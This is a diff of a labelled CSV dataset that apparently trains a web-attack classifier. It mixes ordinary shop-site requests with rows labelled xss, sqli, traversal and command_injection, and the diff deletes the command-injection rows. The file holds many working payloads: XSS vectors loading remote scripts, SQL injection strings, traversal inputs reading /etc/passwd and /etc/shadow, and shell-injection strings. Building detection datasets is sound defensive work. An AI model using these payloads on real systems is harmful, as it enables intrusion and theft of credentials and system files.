@@ -64,7 +64,6 @@ index.jsp,normal
 index.jsp,normal
 imagenes/3.gif,normal
 "<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
-| id,command_injection
 """/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss
 eval(a+b+c+d);,xss
 &ltscript&gtalert(document.cookie);&ltscript&gtalert,xss
@@ -343,7 +342,6 @@ publico/autenticar.jsp?modo=entrar&login=moyers&pwd=tard%F3n&remember=on&B1=Entr
 "';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//"";;alert(String.fromCharCode(88,83,83))//\"";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;"";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",xss
 <svg><script>//&NewLine;confirm(1);</script </svg>,xss
 "<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
-|/usr/bin/id,command_injection
 miembros/salir.jsp,normal
 index.jsp,normal
 publico/productos.jsp,normal
@@ -352,7 +350,6 @@ publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 "&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1",sqli
 publico/caracteristicas.jsp?id=2,normal
 %0a/bin/cat%20/etc/shadow,traversal
-`ping 127.0.0.1`,command_injection
 miembros/imagenes/ogono.jpg,normal
 miembros/index.jsp,normal
 miembros/index.jsp,normal
@@ -515,7 +512,6 @@ miembros/index.jsp,normal
 "<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss
 ' or a=a--,sqli
 miembros/imagenes/ogono.jpg,normal
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,command_injection
 <iframe src=http://ha.ckers.org/scriptlet.html <,xss
 imagenes/2.gif,normal
 miembros/imagenes/ogono.jpg,normal
@@ -573,7 +569,6 @@ global/estilos.css,normal
 \u003c,xss
 miembros/editar.jsp?modo=registro&login=naresh&password=72nt89CT7V1&nombre=Eulalio&apellidos=Escudero+Ostria&email=gorse%4016horas.yu&dni=86274990N&direccion=Calle+Fermin+Salvochea+155+&ciudad=Alcolea+del+Pinar&cp=14230&provincia=Teruel&ntc=0981560265462116&B1=Registrar,normal
 &lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,xss
-;id|,command_injection
 &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;,xss
 publico/productos.jsp,normal
 miembros/imagenes/ogono.jpg,normal
@@ -715,7 +710,6 @@ miembros/index.jsp,normal
 global/creditos.jsp,normal
 imagenes/3.gif,normal
 %7C,sqli
-a)|/usr/bin/id;,command_injection
 publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=94&B1=A%F1adir+al+carrito,normal
 Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser,xss
 "<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",xss
@@ -742,7 +736,6 @@ so..&: select * from users where id='1'<@.. or 1=1 -- 1',sqli
 %2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 "<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",xss
-;id\n,command_injection
 publico/autenticar.jsp?modo=entrar&login=mizerk&pwd=balitear&remember=off&B1=Entrar,normal
 "<IMG SRC=x ondragend=""alert(String.fromCharCode(88,83,83))"">",xss
 miembros/editar.jsp?modo=registro&login=carilyn&password=e1pirativo&nombre=Aventino&apellidos=Abell%F3+Lamarca&email=plang_schallert%40white-pearl-resort.kp&dni=66718383Y&direccion=C%2F+Misericordia%2C+57+7-H&ciudad=Baides&cp=35231&provincia=Valladolid&ntc=6302817063301722&B1=Registrar,normal
@@ -1013,7 +1006,6 @@ imagenes/cmenbul.gif,normal
 imagenes/nuestratierra.jpg,normal
 <<SCRIPT>%(payload)s//<</SCRIPT>,xss
 miembros/imagenes/castro.jpg,normal
-a);/usr/bin/id,command_injection
 ../../../../../../../../../../../../etc/passwd%00,traversal
 <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
 publico/registro.jsp?modo=registro&login=morten&password=sINCr5Nica&nombre=Solano&apellidos=Mera+Alc%E1cer&email=cambre%40be%F1esmer.na&dni=99783130E&direccion=Calle+Hostieros%2C+24+&ciudad=Brihuega&cp=50700&provincia=Cuenca&ntc=3581640568970302&B1=Registrar,normal
@@ -1176,7 +1168,6 @@ publico/productos.jsp,normal
 "`""'><img src='#\x27 onerror=javascript:alert(1)>",xss
 "<IMG DYNSRC=""javascript:alert('XSS')"">",xss
 """&<script>document.write(""""XSS-XSS-XSS"""");</script>""",xss
-|id,command_injection
 publico/productos.jsp,normal
 miembros/index.jsp,normal
 global/estilos.css,normal
@@ -1371,7 +1362,6 @@ publico/carrito.jsp,normal
 "&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1",sqli
 "<img src=""javascript:document.vulnerable=true;"">",xss
 "<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",xss
-a);/usr/bin/id|,command_injection
 imagenes/3.gif,normal
 &#X0003c;,xss
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
@@ -1388,8 +1378,6 @@ miembros/fotos.jsp,normal
 publico/registro.jsp?modo=registro&login=barron&password=0h5RrAd0&nombre=Norelia&apellidos=Isart+Schwarzenberg&email=roseman-hensley%40fighting-machines.wf&dni=17923027R&direccion=C%2F+Santisimo+Cristo+Del+Amor%2C+186%2C+&ciudad=Sant+Esteve+de+la+Sarga&cp=41420&provincia=Segovia&ntc=5889772581195146&B1=Registrar,normal
 publico/pagar.jsp?modo=insertar&precio=6246&B1=Confirmar,normal
 %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal
-\n/bin/ls -al\n,command_injection
-a|/usr/bin/id,command_injection
 <script x> alert(1) </script 1=2,xss
 miembros/imagenes/zarauz.jpg,normal
 "<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
@@ -1436,7 +1424,6 @@ global/estilos.css,normal
 global/titulo.jsp,normal
 "<;SCRIPT SRC="";http://ha.ckers.org/xss.jpg"";>;<;/SCRIPT>;",xss
 """ """,sqli
-;id;,command_injection
 index.jsp,normal
 miembros/editar.jsp?modo=registro&login=lonald8&password=86Et4aR&nombre=Fabricio&apellidos=Linares+Barreras&email=kyle%40psykoterapeut.tv&dni=02906029W&direccion=Pasaje+Arquitecto+Gaudi+85%2C+&ciudad=Santa+Marina+del+Rey&cp=31594&provincia=Granada&ntc=9047664799943774&B1=Registrar,normal
 imagenes/2.gif,normal
@@ -1478,7 +1465,6 @@ miembros/salir.jsp,normal
 imagenes/nuestratierra.jpg,normal
 "s:,s: select * from users where id=1 or "":,"" or 1=1 -- 1",sqli
 imagenes/1.gif,normal
-& ping -n 30 127.0.0.1 &,command_injection
 publico/carrito.jsp,normal
 publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=33&B1=A%F1adir+al+carrito,normal
 <svg><script ?>alert(1),xss
@@ -1500,7 +1486,6 @@ publico/carrito.jsp,normal
 global/menum.jsp,normal
 """ or ""x""=""x",sqli
 publico/pagar.jsp?modo=insertar&precio=4248&B1=Pasar+por+caja,normal
-|/usr/bin/id|,command_injection
 imagenes/1.gif,normal
 publico/pagar.jsp?modo=insertar&precio=2759&B1=Confirmar,normal
 """<SCRIPT a="""">"""" SRC=""""http://ha.ckers.org/xss.js""""></SCRIPT>""",xss
@@ -1817,7 +1802,6 @@ publico/carrito.jsp,normal
 "<div/onmouseover='alert(1)'> style=""x:"">",xss
 &lt;HTML xmlns:xss&gt;,xss
 """<img src=""""blah""""onmouseover=""""document.write(""""XSS-XSS-XSS"""");"""">""",xss
-a|id,command_injection
 &lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;,xss
 imagenes/3.gif,normal
 publico/miembros.jsp,normal
@@ -1960,7 +1944,6 @@ publico/caracteristicas.jsp?id=2,normal
 ./.././.././../{FILE},traversal
 "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
 imagenes/logo.gif,normal
-|/bin/ls -al,command_injection
 /../../../../../../../../../../etc/passwd,traversal
 "<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 imagenes/nuestratierra.jpg,normal
@@ -2222,7 +2205,6 @@ global/creditos.jsp,normal
 publico/miembros.jsp,normal
 "<img src\x12=x onerror=""javascript:alert(1)"">",xss
 publico/pagar.jsp?modo=insertar&precio=4725&B1=Pasar+por+caja,normal
-a;id|,command_injection
 <IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>,xss
 miembros/index.jsp,normal
 miembros/editar.jsp?modo=registro&login=forslund&password=im%24ponderable&nombre=Ravid&apellidos=Bonany+Lambarri&email=lightnin%40grupodescansoyhogar.web&dni=70679983V&direccion=Calle+Barrio+Villayuda+169%2C+&ciudad=Ari%F1o&cp=08170&provincia=Segovia&ntc=0664227829030755&B1=Registrar,normal
@@ -2572,7 +2554,6 @@ global/estilos.css,normal
 global/titulo.jsp,normal
 publico/pagar.jsp?modo=insertar&precio=7361&B1=Confirmar,normal
 "UE1nn: select * from users where id=1 union select .1$_,version() -- 1",sqli
-a)|/usr/bin/id,command_injection
 miembros/imagenes/castro.jpg,normal
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
 publico/registro.jsp?modo=registro&login=gwenny&password=BOCana%24da&nombre=Danimiro&apellidos=Prosd%F3cimo+Surinyac&email=maren-bufford4%40fruteriacartaya.yu&dni=04212893Y&direccion=C%2F+Galicia%2C+180%2C+&ciudad=Robleda&cp=06440&provincia=C%F3rdoba&ntc=1856004857366548&B1=Registrar,normal
@@ -2824,7 +2805,6 @@ miembros/imagenes/ogono.jpg,normal
 imagenes/1.gif,normal
 miembros/editar.jsp?modo=registro&login=phillis7&password=e7aTO&nombre=Josefa&apellidos=Vallb%E9+Remesar&email=mcginnis-dellagnese%40storagecraft.na&dni=21444030A&direccion=C%2F+Rivera+De+Los+Limonetes+98+&ciudad=Algemes%ED&cp=47162&provincia=C%E1ceres&ntc=2771560137305516&B1=Registrar,normal
 "<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
-& ping -i 30 127.0.0.1 &,command_injection
 select,sqli
 "&1UE1: select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1",sqli
 global/estilos.css,normal
@@ -2920,7 +2900,6 @@ index.jsp,normal
 "s{UEf: select * from users where id=1 or 1#""{ union select version(),version() -- 1",sqli
 "<style>li {list-style-image: url(""javascript:document.vulnerable=true;"");</STYLE><UL><LI>XSS",xss
 .//..//{FILE},traversal
-;netstat -a;,command_injection
 global/menum.jsp,normal
 miembros/imagenes/castro.jpg,normal
 "sUEvv: select * from users where id='1' union select @ @1,version() --  1'",sqli
@@ -2992,7 +2971,6 @@ publico/vaciar.jsp?B2=Vaciar+carrito,normal
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
 """<A HREF=""""//google"""">XSS</A>""",xss
 "&lt;EMBED SRC=\""data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\"" type=\""image/svg+xml\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",xss
-/index.html|id|,command_injection
 global/estilos.css,normal
 "s&v(1: select * from users where id='1' or @(1)=1 union select 1,version() -- 1'",sqli
 global/creditos.jsp,normal
@@ -3197,7 +3175,6 @@ global/estilos.css,normal
 "<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
 "<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 "<IMG SRC=x ondurationchange=""alert(String.fromCharCode(88,83,83))"">",xss
-a;/usr/bin/id,command_injection
 <input value=<><iframe/src=javascript:confirm(1),xss
 publico/productos.jsp,normal
 miembros/imagenes/zarauz.jpg,normal
@@ -3748,7 +3725,6 @@ imagenes/3.gif,normal
 "<img\x47src=x onerror=""javascript:alert(1)"">",xss
 publico/autenticar.jsp?modo=entrar&login=ersil&pwd=teosa&remember=on&B1=Entrar,normal
 "<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,command_injection
 "<xml id=""X""><a><b><script>document.vulnerable=true;</script>;</b></a></xml>",xss
 miembros/imagenes/ogono.jpg,normal
 <style onreadystatechange=javascript:javascript:alert(1);></style>,xss
@@ -3800,7 +3776,6 @@ global/estilos.css,normal
 """`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",xss
 global/titulo.jsp,normal
 publico/productos.jsp,normal
-\n/usr/bin/id\n,command_injection
 imagenes/3.gif,normal
 <IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>,xss
 "javascript:alert(""hellox worldss"")",xss
@@ -4079,7 +4054,6 @@ publico/carrito.jsp,normal
 miembros/index.jsp,normal
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
 "s?s: select * from users where id='1' union select ""?""_,version() -- 1'",sqli
-;id,command_injection
 ..\\..\\..\\..\\..\\..\\..\\..\\{FILE},traversal
 imagenes/nuestratierra.jpg,normal
 "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",sqli
@@ -4207,7 +4181,6 @@ miembros/fotos.jsp,normal
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
 "'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",xss
 <style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>,xss
-;/usr/bin/id\n,command_injection
 <STYLE>@import'%(css)s';</STYLE>,xss
 %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE},traversal
@@ -4425,7 +4398,6 @@ global/titulo.jsp,normal
 "<body onLoad=""alert('XSS');""   ",xss
 1;SELECT%20*,sqli
 """`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",xss
-%0Aid,command_injection
 %3C,xss
 "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",sqli
 ..\..\\..\..\\..\..\\{FILE},traversal
@@ -4463,7 +4435,6 @@ publico/productos.jsp,normal
 "<;LINK REL="";stylesheet""; HREF="";http://ha.ckers.org/xss.css"";>;",xss
 imagenes/cmenbul.gif,normal
 miembros/imagenes/castro.jpg,normal
-a);id,command_injection
 imagenes/1.gif,normal
 miembros/salir.jsp,normal
 %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,xss
@@ -4498,7 +4469,6 @@ imagenes/3.gif,normal
 "<br size=""&{alert('XSS')}"">   ",xss
 miembros/editar.jsp?modo=registro&login=hau&password=GarlaDORa&nombre=Mait%E9n&apellidos=Trespalacios+Latorre&email=macgregor_poomjai%40a2hotels.bj&dni=38747653J&direccion=Joaquin+Verdaguer%2C+183+&ciudad=Oseja&cp=16411&provincia=Cuenca&ntc=5203672961472442&B1=Registrar,normal
 </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,xss
-%0A/usr/bin/id%0A,command_injection
 miembros/index.jsp,normal
 ..\..\\..\..\\{FILE},traversal
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
@@ -4585,7 +4555,6 @@ imagenes/3.gif,normal
 global/menum.jsp,normal
 miembros/editar.jsp?modo=registro&login=ketchum&password=colmada&nombre=Denice&apellidos=Abell%F3+Lamarca&email=entwistle_ruetting%40comonuevo.ro&dni=90127318R&direccion=Avinguda+Francesc+Macia.%2C+30+3%3FB&ciudad=Briviesca&cp=15553&provincia=Cuenca&ntc=2756434329152004&B1=Registrar,normal
 global/menum.jsp,normal
-`/usr/bin/id`,command_injection
 ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},traversal
 ';//%0da=eval;b=alert;a(b(9));//,xss
 <scr<script>ipt>alert(1)</scr</script>ipt>,xss
@@ -4606,9 +4575,7 @@ miembros/editar.jsp?modo=registro&login=maggee&password=m1n*6848&nombre=Mar%EDa+
 publico/autenticar.jsp?modo=entrar&login=cas&pwd=82pe6m77b57i0a%2Bd&remember=on&B1=Entrar,normal
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\{FILE},traversal
 "&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
-a;/usr/bin/id|,command_injection
 "<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
-\n/usr/bin/id|,command_injection
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
 "UEo1,: select * from users where id=1 union select !<1,version() -- 1",sqli
 <img src=&{document.vulnerable=true;};>,xss
@@ -4667,7 +4634,6 @@ miembros/imagenes/castro.jpg,normal
 <script\x09>javascript:alert(1)</script>,xss
 admin') or '1'='1'--,sqli
 publico/productos.jsp,normal
-|nid\n,command_injection
 index.jsp,normal
 a,sqli
 ./\/././\/././\/././\/././\/././\/././\/././\/./{FILE},traversal
@@ -4978,7 +4944,6 @@ publico/productos.jsp,normal
 "<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
 &#X000003C,xss
 1' and 1=(select count(*) from tablenames); --,sqli
-a|id,command_injection
 miembros/index.jsp,normal
 imagenes/2.gif,normal
 &#x0003C,xss
@@ -5124,7 +5089,6 @@ miembros/imagenes/castro.jpg,normal
 miembros/imagenes/ogono.jpg,normal
 n1&1c: select * from users where id=1 +$ 1 or 1=1 -- 1,sqli
 .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\{FILE},traversal
-%0a id %0a,command_injection
 8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 -->,sqli
 <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
 global/menum.jsp,normal
@@ -5243,7 +5207,6 @@ publico/miembros.jsp,normal
 "s{(s: select * from users where id=1 or ""{(""=1 or 1=1 -- 1",sqli
 ./\/././\/././\/././\/./{FILE},traversal
 global/menum.jsp,normal
-a)|id;,command_injection
 publico/productos.jsp,normal
 "<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
@@ -5391,7 +5354,6 @@ miembros/index.jsp,normal
 %252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
 miembros/imagenes/ogono.jpg,normal
 "s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'",sqli
-;id;,command_injection
 "<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss
 <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
 "<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
@@ -5409,7 +5371,6 @@ sleep(9999),sqli
 <--`<img/src=` onerror=alert(1)> --!>,xss
 %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal
 %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal
-||/usr/bin/id;,command_injection
 "<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",xss
 imagenes/cmenbul.gif,normal
 imagenes/cmenbul.gif,normal
@@ -5439,7 +5400,6 @@ miembros/imagenes/zarauz.jpg,normal
 "<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
 miembros/index.jsp,normal
 publico/caracteristicas.jsp?id=2,normal
-\nid|,command_injection
 "ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",xss
 imagenes/cmenbul.gif,normal
 miembros/imagenes/ogono.jpg,normal
@@ -5686,9 +5646,7 @@ miembros/imagenes/ogono.jpg,normal
 publico/autenticar.jsp?modo=entrar&login=mcallum&pwd=garabero&remember=off&B1=Entrar,normal
 global/creditos.jsp,normal
 publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=17&B1=A%F1adir+al+carrito,normal
-a;id,command_injection
